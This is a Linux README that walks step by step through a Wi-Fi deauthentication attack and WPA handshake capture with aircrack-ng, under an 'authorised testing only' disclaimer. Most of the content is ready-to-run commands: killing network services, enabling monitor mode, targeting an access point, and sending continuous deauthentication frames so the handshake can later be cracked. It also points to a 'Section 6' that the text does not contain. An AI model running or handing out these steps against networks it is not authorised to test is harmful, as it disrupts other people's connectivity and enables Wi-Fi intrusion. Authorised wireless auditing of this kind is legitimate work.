## ⚠️ Disclaimer

> This guide is for **educational purposes only**. Unauthorized access or disruption of any network is illegal and unethical. Only test on networks **you own or have explicit permission** to audit.

---

# 🔧 Wi-Fi Deauthentication Attack and Handshake Capture Guide (Linux)

This README outlines the steps to perform a deauthentication attack and capture a WPA handshake using `aircrack-ng` tools on a compatible wireless card in monitor mode.

---

## 🛠 Prerequisites

* A compatible Wi-Fi adapter that supports monitor mode and packet injection
* Linux OS
* `aircrack-ng` suite installed

Install it if not already:

```bash
sudo apt update && sudo apt install aircrack-ng -y
```

---

## 1. Identify Wireless Interface

```bash
iwconfig
```

Look for your wireless adapter (e.g., `wlo1`). It should show IEEE 802.11 capabilities.

---

## 2. Kill Conflicting Processes

Before enabling monitor mode, kill network managers to avoid interference:

```bash
sudo airmon-ng check kill
```

> 📝 **Note**: This will disconnect you from the internet.

---

## 3. Enable Monitor Mode

Use `airmon-ng` to put your wireless adapter into monitor mode:

```bash
sudo airmon-ng start wlo1
```

This will likely create a new interface (e.g., `wlo1mon`).

---

## 4. Discover Nearby Access Points

Use `airodump-ng` to scan for wireless networks:

```bash
sudo airodump-ng wlo1mon
```

* **BSSID**: MAC address of the access point
* **CH**: Channel
* **ESSID**: Network name (SSID)

> Make note of the **BSSID** and **channel** of your target network.

---

## 4.5. Capture WPA Handshake

To capture the WPA handshake, you'll need to run `airodump-ng` specifically on the target network's channel and BSSID, while also performing a deauthentication attack to force a client to reconnect and generate the handshake.

1.  **Start `airodump-ng` to capture the handshake:**
    Open a new terminal window and run:
    ```bash
    sudo airodump-ng -c <channel> --bssid <BSSID> -w <output_filename> <monitor_interface>
    ```
    *   Replace `<channel>` with the target network's channel.
    *   Replace `<BSSID>` with the target network's BSSID.
    *   Replace `<output_filename>` with a name for your capture file (e.g., `wpa_handshake`). This will create files like `wpa_handshake-01.cap`.
    *   Replace `<monitor_interface>` with your monitor mode interface (e.g., `wlo1mon`).

    Keep this terminal window open and running. `airodump-ng` will listen for the handshake.

2.  **Perform a deauthentication attack (in another terminal):**
    While `airodump-ng` is running, go to your original terminal and perform the deauthentication attack as described in **Section 6** of the original `Deauth.md` (or use the command below). This will disconnect clients, and when they reconnect, `airodump-ng` should capture the handshake.

    ```bash
    sudo aireplay-ng --deauth 0 -a <BSSID> <monitor_interface>
    ```
    You'll see a message like `WPA handshake: <BSSID>` in the `airodump-ng` terminal when a handshake is captured.

---